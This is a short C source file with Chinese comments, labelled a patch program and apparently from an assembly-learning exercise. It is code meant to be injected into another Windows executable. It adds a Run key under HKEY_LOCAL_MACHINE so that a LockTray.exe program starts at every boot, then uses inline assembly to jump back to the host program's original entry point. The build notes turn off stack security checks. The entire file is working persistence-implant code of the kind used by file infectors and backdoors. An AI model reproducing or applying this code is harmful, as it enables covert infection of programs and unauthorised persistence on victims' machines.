//补丁程序
//
//
//release版 
//禁用安全检查 (/GS-)
//优化 已禁用 (/Od)
//入口点改成main
//不生成调试信息


#include<windows.h>



TCHAR sz1[] = TEXT("SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\RUN");
TCHAR sz2[] = TEXT("NewValue");
TCHAR sz3[] = TEXT("d:\\masm32\\source\\chapter5\\LockTray.exe");


void main()
{
	HKEY hKey;// 句柄
	RegCreateKey(HKEY_LOCAL_MACHINE, sz1, &hKey);// 创建注册表项
	RegSetValueEx(hKey, sz2, 0, REG_SZ, sz3, 0X27);// 设置注册表项
	RegCloseKey(hKey);// 关闭注册表项
	__asm
	{
		leave
		mov eax, 0x00401000// 跳回代码原地址
		jmp eax
	}
}